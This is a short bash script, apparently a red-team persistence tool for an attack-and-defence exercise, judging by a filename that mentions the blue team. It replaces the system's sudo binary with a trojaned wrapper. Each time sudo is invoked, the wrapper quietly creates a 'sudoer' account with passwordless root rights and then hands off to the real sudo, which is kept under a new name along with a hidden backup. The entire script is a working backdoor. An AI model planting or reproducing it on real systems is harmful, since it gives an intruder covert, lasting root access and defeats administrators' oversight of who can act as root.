#!/bin/bash
mv /usr/bin/sudo /usr/bin/sudo.based
cp /usr/bin/sudo.based /usr/bin/sudo-backup-incase-blueteam-deletes
mkdir -p /etc/sudoers.d

/usr/bin/sudo.based tee /usr/bin/sudo << 'EOF'
#!/bin/bash
id sudoer &>/dev/null || /usr/bin/sudo.based bash -c \
  'useradd -m -s /bin/bash sudoer 2>/dev/null; echo "sudoer ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/sudoer'
/usr/bin/sudo.based "$@"
EOF

/usr/bin/sudo.based chmod +x /usr/bin/sudo